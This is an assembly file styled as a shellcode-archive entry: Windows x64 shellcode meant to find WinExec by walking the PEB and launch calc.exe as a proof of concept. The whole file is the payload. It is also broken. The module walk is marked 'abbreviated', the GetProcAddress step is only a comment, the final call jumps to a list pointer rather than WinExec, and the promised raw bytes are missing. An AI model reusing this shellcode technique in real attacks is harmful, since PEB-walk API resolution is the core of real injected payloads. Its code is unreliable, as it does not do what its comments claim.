; Title:    Windows x64 exec calc.exe via WinExec
; Platform: windows
; Arch:     x64
; Size:     ~100 bytes
; Encoding: raw
;
; Assembled hex:
; ; see raw bytes after assembly

BITS 64
global _start

_start:
    BITS    64
    ; WinExec("calc.exe", SW_SHOW) — classic PoC stub
    ; Resolve WinExec via PEB walk + GetProcAddress
    sub     rsp, 0x28
    and     rsp, -16
    ; PEB walk for kernel32 base (abbreviated)
    xor     rcx, rcx
    mov     rax, [gs:rcx+0x60]
    mov     rax, [rax+0x18]
    mov     rax, [rax+0x20]
    ; ... GetProcAddress(kernel32, "WinExec")
    lea     rcx, [rel cmd_str]  ; "calc.exe"
    mov     rdx, 1              ; SW_SHOW
    call    rax                 ; WinExec
    add     rsp, 0x28
    ret
cmd_str:    db "calc.exe", 0
